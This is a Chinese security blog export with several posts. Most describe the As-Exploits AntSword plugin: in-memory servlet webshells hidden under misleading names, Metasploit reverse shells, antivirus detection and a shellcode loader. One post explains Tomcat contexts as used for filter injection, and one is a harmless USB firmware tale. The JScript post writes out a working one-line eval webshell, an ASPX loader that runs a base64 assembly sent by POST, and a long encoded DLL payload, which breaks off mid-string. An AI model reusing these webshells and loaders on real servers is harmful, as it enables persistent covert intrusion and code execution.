只能addServletMappingDecoded在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。Spring下运行截图获取Servlet打入蚁剑内存马再次获取Servlet，发现已经有了，并且在第一位。连接成功卸载Servlet卸载后再次获取Servlet列表虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。现有模块介绍基本信息获取当前服务端信息。支持类型：php/jsp/aspxphpjspaspx反弹Shell跟MSF联动支持类型：php/jsp/aspxPayload目前支持以下类型：java/meterpreter/reverse_tcpjava/shell/reverse_tcpjava/meterpreter/bind_tcpjava/shell/bind_tcpphp/meterpreter/reverse_tcpphp/shell/reverse_tcpphp/meterpreter/bind_tcpphp/shell/bind_tcpwindows/meterpreter/reverse_tcpwindows/x64/meterpreter/reverse_tcp内存马一键打入内存Webshell，由于时间仓促，目前仅支持Servlet型内存马。支持类型：jsp可打入的内存马种类：AntSwordBehinderGodzilla-Base64reGerog组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。其中AntSword类型支持Tomcat(5-9)、Spring。打入哥斯拉内存马打入Godzilla-Base64内存马在哥斯拉中连接成功杀软识别数据来源是key师傅的项目：avList通过tasklist /svc获取当前进程列表，识别出其中的杀软。支持类型：php/jsp/aspx目前支持手动跟自动两种获取方式：自动获取自动执行tasklist /svc并分析回显数据。手动获取手动输入tasklist /svc的结果。提权辅助通过systeminfo来获取补丁信息，从而给出提权建议。支持类型：php/jsp/aspx同样支持手动跟自动两种获取方式。屏幕截图获取目标当前屏幕截图。支持类型：jsp/aspxShellCode加载器加载shellcode至内存运行。（shellcode为hex格式，且不能有多余空格或换行）支持类型：aspx以msf为例：msfvenom生成hex格式的shellcode粘贴进输入框，点击exploit收到Meterpreter会话Jar加载器加载Jar到JVM内存中。过程中文件不落地，可用于上传数据库驱动等。支持类型：jsp注意事项本插件仅供合法的渗透测试以及爱好者参考学习，请勿用于非法用途，否则自行承担相关责任。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[As-Exploits内存马兼容Spring]]></title>
    <url>%2Fposts%2FAs-Exploits-Memory-Shell-For-Spring%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[关于Tomcat中的三个Context的理解]]></title>
    <url>%2Fposts%2Ftomcat-context%2F</url>
    <content type="text"><![CDATA[p牛在知识星球里问了一个问题：Tomcat中这三个StandardContext、ApplicationContext、ServletContext都是干什么的skay师傅给出了自己的理解：https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew这里来讲一讲我的理解，说的不一定对，仅供参考。Contextcontext是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？根据我的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。ServletContextServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116package javax.servlet;...public interface ServletContext &#123; String TEMPDIR = &quot;javax.servlet.context.tempdir&quot;; String ORDERED_LIBS = &quot;javax.servlet.context.orderedLibs&quot;; String getContextPath(); ServletContext getContext(String var1);... /** @deprecated */ @Deprecated Servlet getServlet(String var1) throws ServletException; /** @deprecated */ @Deprecated Enumeration&lt;Servlet&gt; getServlets(); /** @deprecated */ @Deprecated Enumeration&lt;String&gt; getServletNames(); void log(String var1); /** @deprecated */ @Deprecated void log(Exception var1, String var2); void log(String var1, Throwable var2); String getRealPath(String var1); String getServerInfo(); String getInitParameter(String var1); Enumeration&lt;String&gt; getInitParameterNames(); boolean setInitParameter(String var1, String var2); Object getAttribute(String var1); Enumeration&lt;String&gt; getAttributeNames(); void setAttribute(String var1, Object var2); void removeAttribute(String var1); String getServletContextName(); Dynamic addServlet(String var1, String var2); Dynamic addServlet(String var1, Servlet var2); Dynamic addServlet(String var1, Class&lt;? extends Servlet&gt; var2); Dynamic addJspFile(String var1, String var2); &lt;T extends Servlet&gt; T createServlet(Class&lt;T&gt; var1) throws ServletException; ServletRegistration getServletRegistration(String var1); Map&lt;String, ? extends ServletRegistration&gt; getServletRegistrations(); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class&lt;? extends Filter&gt; var2); &lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; var1) throws ServletException; FilterRegistration getFilterRegistration(String var1); Map&lt;String, ? extends FilterRegistration&gt; getFilterRegistrations(); SessionCookieConfig getSessionCookieConfig(); void setSessionTrackingModes(Set&lt;SessionTrackingMode&gt; var1); Set&lt;SessionTrackingMode&gt; getDefaultSessionTrackingModes(); Set&lt;SessionTrackingMode&gt; getEffectiveSessionTrackingModes(); void addListener(String var1); &lt;T extends EventListener&gt; void addListener(T var1); void addListener(Class&lt;? extends EventListener&gt; var1); &lt;T extends EventListener&gt; T createListener(Class&lt;T&gt; var1) throws ServletException; JspConfigDescriptor getJspConfigDescriptor(); ClassLoader getClassLoader(); void declareRoles(String... var1); String getVirtualServerName(); int getSessionTimeout(); void setSessionTimeout(int var1); String getRequestCharacterEncoding(); void setRequestCharacterEncoding(String var1); String getResponseCharacterEncoding(); void setResponseCharacterEncoding(String var1);&#125;ApplicationContext在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看这篇文章，简单来讲就是加一层包装。其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等StandardContextStandardContext存在于org.apache.catalina.core.StandardContext。实际上研究ApplicationContext的代码会发现，ApplicationContext所实现的方法其实都是调用的this.context中的方法而这个this.context就是一个实例化的StandardContext对象。所以在我看来，StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。用下面这张图来展示一下其中的关系回过头看内存马。以添加filter为例，从上面的分析我们可以知道ApplicationContext跟Standerdcontext这两个东西都有addFilter的方法。那么实际选用哪一个呢？其实两种办法都可以。三梦师傅在基于tomcat的内存 Webshell 无文件攻击技术这篇文章里是利用反射修改了Tomcat的LifecycleState，绕过限制条件调用的ApplicationContext中的addFilter方法。但是因为实际上最终调用的还是StandardContext的addFilter方法，所以我们就可以直接调用StandardContext的addFilter方法进行绕过，从而省去了绕过一堆判断的过程。这种实现具体可以看这个师傅的公众号文章。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[金士顿 DTSE9G2 128G U盘量产踩坑记]]></title>
    <url>%2Fposts%2Fmake-usb-great-again%2F</url>
    <content type="text"><![CDATA[前言买过金士顿U盘的应该都知道一般金士顿是不支持bitlocker的，但是这样又很不方便，就想捣鼓一下。从naivekun师傅那里知道了一个词叫量产，通过给U盘刷固件，就可以让U盘被识别为一个CD或者硬盘，从而支持bitlocker。结果折腾了两天。。。踩了各种坑。一开始刷炸了之后128g缩水成32g，然后又捣鼓捣鼓救了回来，反而扩容到了132g？神秘。前期准备型号：金士顿 DTSE9G2 128G工具：ChipGenius​ ST-TOOL_9000_v3.7F.92参数设置下载工具解压后打开STTOOL_F1_90_v200_00_SZ.exe点击更新识别U盘，然后进入设定固件档案中选择的是2309_hv3_ED3_T_1P.BIN而不是上文教程中的2309_hv3_ED3_M_1P.BIN。因为猜测M是mlc的意思，T是tlc的意思。ChipGenius中显示U盘是tlc，所以换成了2309_hv3_ED3_T_1P.BIN。这里选择容量优先自己是已经低格一遍了，所以选的高格扫描，分类方式选择容量有限。低格一次4-5个小时，高格一次3-5分钟左右。因为我的CE是4个就选的4，Capacity是U盘容量大小，我选择的是自动，也可以设置指定大小。搞完后点击保存，返回上个界面。坑0x01量产工具要在本机运行，不要在虚拟机里面运行，否则会提示奇奇怪怪的错误。被坑了好久0x02开始naivekun师傅是按照这个教程来的[教程] 群联PS2251-09(PS2309)U盘量产，刷完之后发现128g缩水到了32g。帖子下面也有人出现了同样的问题64g的没事，128g的就缩水。刚开始以为是CE太多，固件不兼容啥的，后来发现其实是因为工具默认使用的是速度优先策略，会把低速数据块抛弃，才会导致量产后容量变小但是用起来非常顺畅。0x03格完之后不要急着拔U盘，在U盘里新建一个文件再拔，否则再次插入会不识别U盘。神秘量产过程第一次是选择了低格+高格，贼鸡儿慢。。。完事之后去看设备管理器发现已经量产成功，但是拔出U盘再插入就会无法识别。后来用高格又刷了一遍，刚刷完之后没先拔出来，在U盘里新建了一个txt，然后拔出U盘，再次读取，成功识别！但是怎么变成132g了。。。还扩容了呢测试一下读写360U盘鉴定一下容量还行吧，预期范围之内选中U盘右键，终于出现了bitlocker的选项。。。加密驱动器，成功！最后没事还是不要搞量产orz。]]></content>
      <categories>
        <category>随便写写</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Jscript加载Assembly踩坑记]]></title>
    <url>%2Fposts%2Fjscript-load-csharp-assembly%2F</url>
    <content type="text"><![CDATA[前言最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。由于冰蝎跟哥斯拉都采用的C#类型的shell，所以可以直接调用系统的一些api，并且可以加载任意的shellcode。而蚁剑采用的是传统的Jscript。就想找个办法把它们两者结合起来，用Jscript加载C#的assembly，以此来达到兼容原有shell类型的目的。但是在实现的过程中踩了一些坑，所以就写下这篇文章记录一下。理论支持Assembly这里要先提到一个概念叫Assembly，引用一下rebeyond师傅文章中的话：https://xz.aliyun.com/t/2758在Java中，每个类经过编译之后都单独对应一个class文件，而在.net中则不同，.net中不存在单个类对应的二进制文件，而是引入了一个叫做Assembly（程序集）的概念，已编译的类是以Assembly的形式来承载的，Assembly是供CLR执行的可执行文件。在.NET下，托管的DLL和EXE都称之为Assembly，一个Assembly可以包含多个类。java跟.net有很多相似之处，这里我们可以简单的理解为：.net中的assembly就像java中的class。java中使用defineClass来加载一个类到jvm内存中，同样，.net中可以使用Assembly.Load来把assembly加载到内存中。从Jscript到C#蚁剑用的是Jscript，然而冰蝎哥斯拉用的C#，那么能否用Jscript去调用C#呢？答案是可以的，这里附一张.net framework的框架图可以看到最顶层的如C#,VB,Jscript等语言，他们的底层框架都是通用的，都是在.net framework这个体系内。所以C#编译成的assembly在Jscript中是可以通用的。那么Jscript如何将其加载进去呢？由于其中部分基类库Base Class Library(BCL)是共有的。而Assembly.Load刚好在System.Reflection这个命名空间下面，所以我们就可以在Jscript中调用System.Reflection.Assembly.Load来把C#的assembly加载到内存中。这里可能会有同学问了，既然Jscript也是一门独立的语言，理论上C#能实现的他都能实现，为什么还要大费周折再去加载C#呢？其实也不是没有想过直接用Jscript写。。。但是在实现的过程中发现太蛋疼了，Jscript基本搜不到什么文档，报错也搜不到，本人测试过VS，VS code，rider，都没有Jscript的补全跟高亮，开发起来非常难受。另外一个原因是很多开源工具都用的C#实现，采用assembly加载的方式稍微修改一下就可以快速复用。踩坑过程前面扯了这么多主要是理论，当然实现中没有这么顺利。首先新建一个Class Library项目，这里以弹计算器为例。12345678910111213using System.Diagnostics;namespace AntPayload&#123; public class Run &#123; public override bool Equals(object obj) &#123; Process.Start(&quot;calc.exe&quot;); return true; &#125; &#125;&#125;项目自动编译或者手动编译为dll1csc /t:library AntPayload.csbase64一下1base64 -w 0 AntPayload.dll &gt; AntPayload.txtPayload1TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAEXJD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAANicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOQmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACsJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAPAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAYJwAAAAAAAEgAAAACAAUAaCAAAEQFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACQCAAAjU3RyaW5ncwAAAABcBAAAFAAAACNVUwBwBAAAEAAAACNHVUlEAAAAgAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8AzgEGAEwBzgEGACwAnAEPAO4BAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAArwEGAB4ArwEGAIYAhAEGAAwCfQEKAAQCnAEAAAAAAQAAAAAAAQABAAEAEAAZAhMAPQABAAEAUCAAAAAAxgD9ASkAAQBeIAAAAACGGJYBBgACAAAAAQBqAQkAlgEBABEAlgEGABkAlgEKACkAlgEQADEAlgEQADkAlgEQAEEAlgEQAEkAlgEQAFEAlgEQAFkAlgEQAGEAlgEVAGkAlgEQAHEAlgEQAIEAEwIaAHkAlgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEVxdWFscwBQcm9jZXNzAE9iamVjdABTdGFydABSdW5UZXN0AAAAAAARYwBhAGwAYwAuAGUAeABlAAAADuw7XR6MQkeND6FGq61D8gAEIAEBCAMgAAEFIAEBEREEIAEBDgQgA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Dg3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==新建web项目，建立test.aspx测试一下1234567&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;% var Payload =Request.Form(&quot;data&quot;); var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); var myPaylaod=myAssebly.CreateInstance(&quot;AntPayload.Run&quot;).Equals(this); myPaylaod.Equals(this);%&gt;POST：1data=xxxx(上文中的payload)可以证实我们的猜想是成功的，可以用Jscript调用System.Reflection.Assembly.Load执行C#的payload。由于蚁剑的aspx一句话是基于jscript的eval的，所以还要通过一层eval给他传进去。web项目中新建base.aspx1&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%eval(Request.Item[&quot;ant&quot;],&quot;unsafe&quot;);%&gt;POST:1ant=var%20Payload%20%3D%22xxxxxxxxx%22%3B%0Avar%20myAssebly%20%3D%20System.Reflection.Assembly.Load(Convert.FromBase64String(Payload))%3B%0Avar%20myPaylaod%3DmyAssebly.CreateInstance(%22AntPayload.Run%22).Equals(this)%3B%0AmyPaylaod.Equals(this)%3B发现第一次是可以正常调用的但是第二次执行就会提示下面的错误1[A]AntPayload.Run 无法强制转换为 [B]AntPayload.Run。类型 A 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。类型 B 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。搜了一下发现没有什么有用的回答，猜测大概是跟java中类重复加载一样的报错。所以就加了一层判断，如果当前存在 AntPayload.Run 这个类型的assembly就不重复进行加载。新建项目test0.aspx测试一下1234567891011121314151617181920212223 &lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;% var Payload=&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAP2QD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAAMicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOAmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACoJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAOAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAEgAAAACAAUAaCAAAEAFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACACAAAjU3RyaW5ncwAAAABYBAAAFAAAACNVUwBsBAAAEAAAACNHVUlEAAAAfAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8A0gEGAEwB0gEGACwAoAEPAPIBAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAAswEGAB4AswEGAIYAhAEGABACfQEKAAgCoAEAAAAAAQAAAAAAAQABAAEAEACWARMAPQABAAEAUCAAAAAAxgABAikAAQBeIAAAAACGGJoBBgACAAAAAQBqAQkAmgEBABEAmgEGABkAmgEKACkAmgEQADEAmgEQADkAmgEQAEEAmgEQAEkAmgEQAFEAmgEQAFkAmgEQAGEAmgEVAGkAmgEQAHEAmgEQAIEAFwIaAHkAmgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24AUnVuAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBFcXVhbHMAUHJvY2VzcwBPYmplY3QAU3RhcnQAAAAAABFjAGEAbABjAC4AZQB4AGUAAAA945IL3EDlTKxPqJUA/SMAAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFAAESQQ4It3pcVhk04IkEIAECHAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAPAQAKQW50UGF5bG9hZAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAyMQAAKQEAJDUzMTY4RUI2LThBMTgtNDAzRS1CQzQ2LUJGNTY1RkRBMUFFNgAADAEABzEuMC4wLjAAAAAAAAD9kA9gAAAAAAIAAAAcA